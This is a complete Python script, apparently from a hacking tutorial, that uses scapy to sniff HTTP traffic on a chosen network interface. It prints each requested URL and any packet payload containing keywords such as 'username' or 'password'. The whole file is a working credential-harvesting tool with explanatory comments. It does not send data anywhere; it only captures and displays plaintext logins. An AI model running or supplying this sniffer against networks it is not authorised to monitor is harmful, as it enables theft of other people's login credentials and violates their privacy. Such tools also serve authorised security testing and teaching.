#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse

# Function: Parse user input from command line

def get_arguments():
    # Create an ArgumentParser object to handle command-line options
    parser = argparse.ArgumentParser(
        description="HTTP packet sniffer to capture URLs and possible login info."
    )
    
    # Add interface argument (e.g., eth0 or wlan0)
    parser.add_argument(
        "-i", "--interface",
        dest="interface",
        required=True,
        help="Specify the interface to sniff on (e.g., eth0, wlan0)"
    )
    
    # Parse arguments and return them
    args = parser.parse_args()
    return args


# Function: Start sniffing packets on a specific interface

def sniff(interface):
    # scapy.sniff() listens on the specified network interface
    # store=False means packets are not saved in memory
    # prn specifies a callback function that runs for each captured packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Function: Extract the requested URL from an HTTP request packet

def get_url(packet):
    # Combine the Host and Path fields from the HTTP layer
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function: Search for login information in the packet payload

def get_login_info(packet):
    # Check if the packet contains raw data (HTTP POST data)
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # Common keywords that might appear in login forms
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            # Decode bytes to string and search for keywords
            if keyword in load.decode(errors="ignore").lower():
                return load  # Return the payload if keyword found
    return None


# Function: Handle each sniffed packet

def process_sniffed_packet(packet):
    # Only process packets that contain HTTP requests
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url.decode(errors='ignore')}")
        
        # Try to extract login info (e.g., username/password)
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n[+] Possible username/password >> {login_info.decode(errors='ignore')}\n")

# Main entry point

if __name__ == "__main__":
    # Get the network interface from user input
    args = get_arguments()
    
    # Start sniffing on the specified interface
    sniff(args.interface)
